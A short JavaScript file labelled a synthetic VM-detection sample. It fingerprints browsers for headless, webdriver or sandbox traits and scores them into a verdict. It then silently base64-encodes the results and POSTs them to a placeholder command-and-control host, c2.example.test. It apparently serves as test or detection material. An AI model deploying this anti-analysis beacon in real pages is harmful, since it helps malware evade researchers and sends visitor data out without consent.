// VMORACLE — synthetic VM-detection product sample.
(function () {
  var C2 = 'https://c2.example.test/vmcheck';
  function safe(fn, fallback) { try { return fn(); } catch (error) { return fallback; } }
  var gl = safe(function () {
    var canvas = document.createElement('canvas');
    var context = canvas.getContext('webgl');
    return context ? context.getParameter(context.RENDERER) : null;
  }, null);
  var checks = {
    webdriver: navigator.webdriver === true,
    plugins: navigator.plugins.length === 0,
    languages: !navigator.languages || navigator.languages.length === 0,
    webgl: !gl || /SwiftShader|llvmpipe/i.test(String(gl)),
    nativeToString: safe(function () { return Function.prototype.toString.call(Function.prototype.toString).indexOf('[native code]') === -1; }, true),
    evalStack: safe(function () { try { null.x; } catch (error) { return String(error.stack).indexOf('<eval>') !== -1; } return false; }, false),
    intlZone: safe(function () { return typeof Intl === 'undefined'; }, true),
    hardware: (navigator.hardwareConcurrency || 0) <= 1
  };
  var score = Object.keys(checks).filter(function (key) { return checks[key]; }).length;
  var verdict = score === 0 ? 'native' : score < 3 ? 'suspicious' : 'sandbox';
  console.log('[VMORACLE] verdict', verdict, 'score', score);
  try {
    fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ checks: checks, score: score, verdict: verdict })) }).catch(function () {});
  } catch (error) {}
  try { localStorage.setItem('vmoracle:verdict', verdict); } catch (error) {}
})();
